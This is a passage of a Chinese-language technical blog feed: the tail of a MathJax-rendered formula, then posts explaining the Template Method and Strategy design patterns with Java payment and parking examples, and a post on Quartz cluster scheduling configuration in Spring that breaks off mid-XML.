237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(6633.6,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(7205.6,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mrow" transform="translate(7875.2,0)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="28" d="M701 -940Q701 -943 695 -949H664Q662 -947 636 -922T591 -879T537 -818T475 -737T412 -636T350 -511T295 -362T250 -186T221 17T209 251Q209 962 573 1361Q596 1386 616 1405T649 1437T664 1450H695Q701 1444 701 1441Q701 1436 681 1415T629 1356T557 1261T476 1118T400 927T340 675T308 359Q306 321 306 250Q306 -139 400 -430T690 -924Q701 -936 701 -940Z"></path></g><g data-mml-node="mo" transform="translate(736,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(1514,0)"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(220,710)"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(1183.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(2183.4,0)"><path data-c="1D707" d="M58 -216Q44 -216 34 -208T23 -186Q23 -176 96 116T173 414Q186 442 219 442Q231 441 239 435T249 423T251 413Q251 401 220 279T187 142Q185 131 185 107V99Q185 26 252 26Q261 26 270 27T287 31T302 38T315 45T327 55T338 65T348 77T356 88T365 100L372 110L408 253Q444 395 448 404Q461 431 491 431Q504 431 512 424T523 412T525 402L449 84Q448 79 448 68Q448 43 455 35T476 26Q485 27 496 35Q517 55 537 131Q543 151 547 152Q549 153 557 153H561Q580 153 580 144Q580 138 575 117T555 63T523 13Q510 0 491 -8Q483 -10 467 -10Q446 -10 429 -4T402 11T385 29T376 44T374 51L368 45Q362 39 350 30T324 12T288 -4T246 -11Q199 -11 153 12L129 -85Q108 -167 104 -180T92 -202Q76 -216 58 -216Z"></path></g><g data-mml-node="msup" transform="translate(2786.4,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mn" transform="translate(422,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><g data-mml-node="mrow" transform="translate(1272.2,-719.9)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="msup" transform="translate(500,0)"><g data-mml-node="mi"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z"></path></g><g data-mml-node="mn" transform="translate(604,289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><rect width="3812" height="60" x="120" y="220"></rect></g></g><g data-mml-node="mo" transform="translate(5566,0) translate(0 -0.5)"><path data-c="29" d="M34 1438Q34 1446 37 1448T50 1450H56H71Q73 1448 99 1423T144 1380T198 1319T260 1238T323 1137T385 1013T440 864T485 688T514 485T526 251Q526 134 519 53Q472 -519 162 -860Q139 -885 119 -904T86 -936T71 -949H56Q43 -949 39 -947T34 -937Q88 -883 140 -813Q428 -430 428 251Q428 453 402 628T338 922T245 1146T145 1309T46 1425Q44 1427 42 1429T39 1433T36 1436L34 1438Z"></path></g></g></g></g></svg></mjx-container></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mathjax </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式之模版模式</title>
      <link href="/2016/08/23/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E6%A8%A1%E7%89%88%E6%A8%A1%E5%BC%8F/"/>
      <url>/2016/08/23/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E6%A8%A1%E7%89%88%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="废话"><a href="#废话" class="headerlink" title="废话"></a>废话</h1><p>自我修养与自我提升～ , 抛弃重复代码 , 我们叫模版(Template) …</p><p>别问我为啥要用模版，因为在我的一个项目中，有好多好多种类别的支付，复制代码都不好意思了，而且更不好的就是有改动，很容易忘掉些没改。曾经的我复制粘贴，哎，都不好意思…</p><blockquote><p>模板方法模式是类的行为模式。准备一个抽象类，将部分逻辑以具体方法以及具体构造函数的形式实现，然后声明一些抽象方法来迫使子类实现剩余的逻辑。不同的子类可以以不同的方式实现这些抽象方法，从而对剩余的逻辑有不同的实现。这就是模板方法模式的用意。</p></blockquote><p>模版，顾名思义就是有一大堆共有的方法快，或者方法流程，比如说依次执行method_A,method_B…method_N ，里面有些方法是能抽象成一致的，仅方法不同。但是我们又不能在到处都写一样的代码，那怎么搞，那就把这些代码写到一块，不同部分来自定义，想想看，也就是抽象类比较适合了。所以策略模式用的是接口，模版模式用的是抽象类。</p><span id="more"></span><ul><li>代表这些具体逻辑步骤的方法称做基本方法(primitive method)；</li><li>将这些基本方法汇总起来的方法叫做模板方法(template method)</li><li>模板方法所代表的行为称为顶级行为，其逻辑称为顶级逻辑。</li></ul><p>模板方法模式的静态结构图如下所示：</p><p><img src="/assets/images/template.png"></p><h1 id="抽象模板-Abstract-Template"><a href="#抽象模板-Abstract-Template" class="headerlink" title="抽象模板(Abstract Template)"></a>抽象模板(Abstract Template)</h1><ul><li>定义了一个或多个抽象操作，以便让子类实现。这些抽象操作叫做基本操作，它们是一个顶级逻辑的组成步骤。</li><li>定义并实现了一个模板方法。这个模板方法一般是一个具体方法，它给出了一个顶级逻辑的骨架，而逻辑的组成步骤在相应的抽象操作中，推迟到子类实现。顶级逻辑也有可能调用一些具体方法。</li></ul><h1 id="具体模板-Concrete-Template"><a href="#具体模板-Concrete-Template" class="headerlink" title="具体模板(Concrete Template)"></a>具体模板(Concrete Template)</h1><ul><li>实现父类所定义的一个或多个抽象方法，它们是一个顶级逻辑的组成步骤。</li><li>每一个抽象模板角色都可以有任意多个具体模板角色与之对应，而每一个具体模板角色都可以给出这些抽象方法（也就是顶级逻辑的组成步骤）的不同实现，从而使得顶级逻辑的实现各不相同。</li><li>子类可以置换掉父类的可变部分，但是子类却不可以改变模板方法所代表的顶级逻辑。</li></ul><h1 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h1><p>根据支付的类型不同，同步回调（立刻返回数据），异步回调（返回部分数据，另一部分再返回），因为在支付流程上是一致的，但是对返回的结果是不一致的，恰到好处。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractPay</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ApiPay apiResult;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ApiPay <span class="title function_">getApiResult</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> apiResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 同步回调</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">success</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 异步回调</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">accept</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 失败调用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">fail</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">pay</span><span class="params">(ApiPay apiPay)</span> &#123;</span><br><span class="line">        apiResult = Application.context.getBean(PayDubboService.class).pay(apiPay);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> apiResult.getResultCode();</span><br><span class="line">    <span class="keyword">if</span>(code.equals(<span class="string">&quot;success&quot;</span>)) &#123;</span><br><span class="line">    success();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code.equals(<span class="string">&quot;accept&quot;</span>)) &#123;</span><br><span class="line">    accept();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code.equals(<span class="string">&quot;fail&quot;</span>)) &#123;</span><br><span class="line">    fail();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//do something</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ActivePay</span> <span class="keyword">extends</span> <span class="title class_">AbstractPay</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> ParkingPayment payment;</span><br><span class="line">    <span class="keyword">private</span> PaymentMapper paymentMapper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ActivePay</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ActivePay</span><span class="params">(ParkingPayment payment)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.payment = payment;</span><br><span class="line">        <span class="built_in">this</span>.paymentMapper = Application.context.getBean(PaymentMapper.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">success</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//do something, when active pay , notification...</span></span><br><span class="line">        paymentMapper.update(payment);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">accept</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">        paymentMapper.update(payment);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//do something , send to Monitor</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PostpaidPay</span> <span class="keyword">extends</span> <span class="title class_">AbstractPay</span> &#123;</span><br><span class="line"><span class="comment">//省略了，和AvtivePay类似，只是重写不同的方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简直优雅的不要不要的～～</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">AvtivePay</span>(payment).pay(pay);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Design Pattern </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> 模版模式 </tag>
            
            <tag> Template </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式之策略模式</title>
      <link href="/2016/08/23/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F/"/>
      <url>/2016/08/23/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="废话"><a href="#废话" class="headerlink" title="废话"></a>废话</h1><p>自我修养与自我提升～ , 抛弃if , 我们叫策略(Strategy) …</p><p>别问我为啥要用策略，因为在我的一个项目中，一个三方支付系统的通知TMD过来竟然要根据不同的订单做不同的操作，比如有些要通知合作伙伴API，不通知合作伙伴API，不通知API但是改其他表，发起不同的通知给客户端…曾经的我还用if，情况一多，哎，都是泪…</p><blockquote><p>策略模式属于对象的行为模式。其用意是针对一组算法，将每一个算法封装到具有共同接口的独立的类中，从而使得它们可以相互替换。策略模式使得算法可以在不影响到客户端的情况下发生变化。</p></blockquote><span id="more"></span><p>策略模式，顾名思义会有N多个策略，都叫啥些Strategy A，Strategy B… Strategy N<br>策略嘛，应该是对某件是的处理，于是这些策略在高度抽象后应该是一个接口Interface，有共同的策略执行方法，对应于每一个具体策略，其具体的执行方法不同。</p><p>但是只要一个Strategy N 是不够的，直接new嚒，那多不优雅啊，所以还需要再外面包装一下，这里称为Context，这个Context里面包含了这个抽象的Strategy（说接口更合理些），只是实例化的时候传递对应的策略。</p><p>所以大概的关系就是这样：</p><p><img src="/assets/images/strategy.png"></p><ul><li>环境(Context)角色：持有一个Strategy的引用。</li><li>抽象策略(Strategy)角色：这是一个抽象角色，通常由一个接口或抽象类实现。此角色给出所有的具体策略类所需的接口。</li><li>具体策略(ConcreteStrategy)角色：包装了相关的算法或行为。</li></ul><h1 id="策略模式的优点"><a href="#策略模式的优点" class="headerlink" title="策略模式的优点"></a>策略模式的优点</h1><ul><li>策略模式提供了管理相关的算法族的办法。策略类的等级结构定义了一个算法或行为族。恰当使用继承可以把公共的代码移到父类里面，从而避免代码重复。</li><li>使用策略模式可以避免使用多重条件(if-else)语句。多重条件语句不易维护，它把采取哪一种算法或采取哪一种行为的逻辑与算法或行为的逻辑混合在一起，统统列在一个多重条件语句里面，比使用继承的办法还要原始和落后。</li></ul><h1 id="策略模式的缺点"><a href="#策略模式的缺点" class="headerlink" title="策略模式的缺点"></a>策略模式的缺点</h1><ul><li>客户端必须知道所有的策略类，并自行决定使用哪一个策略类。这就意味着客户端必须理解这些算法的区别，以便适时选择恰当的算法类。换言之，策略模式只适用于客户端知道算法或行为的情况。</li><li>由于策略模式把每个具体的策略实现都单独封装成为类，如果备选的策略很多的话，那么对象的数目就会很可观。这也能是什么缺点？</li></ul><h1 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h1><p>在一辆车出入场的时候，对应不同的策略处理逻辑，比如扣费，接口，推送等</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RecordContext</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> RecordStrategy strategy;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RecordContext</span><span class="params">(RecordStrategy strategy)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.strategy = strategy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">process</span><span class="params">()</span> &#123;</span><br><span class="line">        strategy.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RecordStrategy</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EnterStrategy</span> <span class="keyword">implements</span> <span class="title class_">RecordStrategy</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> ParkingRecord record;</span><br><span class="line">    <span class="keyword">private</span> PushDubboService pushDubboService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EntranceStrategy</span><span class="params">(ParkingRecord record)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.record = record;</span><br><span class="line">        <span class="built_in">this</span>.pushDubboService = Application.context.getBean(PushDubboService.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//do something</span></span><br><span class="line">    <span class="built_in">this</span>.pushDubboService.publish(<span class="string">&quot;user enter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LeaveStrategy</span> <span class="keyword">implements</span> <span class="title class_">RecordStrategy</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> ParkingRecord record;</span><br><span class="line">    <span class="keyword">private</span> PushDubboService pushDubboService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LeaveStrategy</span><span class="params">(ParkingRecord record)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.record = record;</span><br><span class="line">        <span class="built_in">this</span>.pushDubboService = Application.context.getBean(PushDubboService.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//do something</span></span><br><span class="line">    <span class="built_in">this</span>.pushDubboService.publish(<span class="string">&quot;user leave&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 就是这么简单，优雅</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">RecordContext</span>(<span class="keyword">new</span> <span class="title class_">EntranceStrategy</span>(record)).process();</span><br></pre></td></tr></table></figure><p>写点优雅的代码～～</p>]]></content>
      
      
      <categories>
          
          <category> Design Pattern </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> 策略模式 </tag>
            
            <tag> Strategy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Quartz集群调度坑</title>
      <link href="/2016/08/21/Quartz%E9%9B%86%E7%BE%A4%E8%B0%83%E5%BA%A6%E5%9D%91/"/>
      <url>/2016/08/21/Quartz%E9%9B%86%E7%BE%A4%E8%B0%83%E5%BA%A6%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>最近将老版本程序的单机版定时任务调度调整到了Quartz，理由在于Spring在集群调度上并不是很适合，Quartz更适合，在这么一迁移后，可以将以前任务相关部分的代码解藕出来，逻辑会更为清晰。再者，接口程序目前已支持多开，但是任务这块尚未支持多开下保证同一类程序有且只有一台执行。</p><p>这次需要合并的达到最终效果是这样：</p><ul><li>Application A～N 使用相同的Quartz数据库</li><li>Application A 处理API任务</li><li>Application B 处理结算方面任务</li><li>Application C 统计任务</li><li>….</li></ul><p>由于Application A和Application B 的job类是不同的，所以默认配置下，多个Application会使用相同的<code>SCHED_NAME</code>,会导致不停的misfire，最终配置需要将不同目的的Application 采用不同的 <code>SCHED_NAME</code>。参考下面配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Our &#x27;AutowiringSpringBeanJobFactory&#x27; implemented in the previous section: --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;quartzJobFactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.chinaroad.settleserver.quartz.AutowiringSpringBeanJobFactory&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- I will not explain this setting, just use it as shown: --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;ignoredUnknownProperties&quot;</span> <span class="attr">value</span>=<span class="string">&quot;applicationContext&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.scheduling.quartz.SchedulerFactoryBean&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Quartz requires a separate &#x27;quartz.properties&#x27; file --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;configLocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;classpath:config/quartz.properties&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;transactionManager&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;transactionManager&quot;</span>/&gt;</span></span><br><span 